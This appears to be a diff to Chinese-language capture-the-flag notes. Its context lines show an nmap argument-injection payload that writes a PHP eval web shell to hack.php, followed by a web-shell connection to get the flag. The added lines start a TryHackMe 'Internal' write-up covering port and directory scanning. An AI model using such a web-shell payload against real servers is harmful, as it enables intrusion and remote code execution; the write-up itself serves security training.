@@ -902,3 +902,9 @@ Nmap的后缀-oG用来将扫描结果存放到文件里。
 `?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
 `
 使用蚁剑连接，即可获取flag
+[THM]Internal
+扫描端口：
+![[Pasted image 20240308181702.png]]
+80，扫描目录：
+![[Pasted image 20240308181733.png]]
+递归扫描/blog:
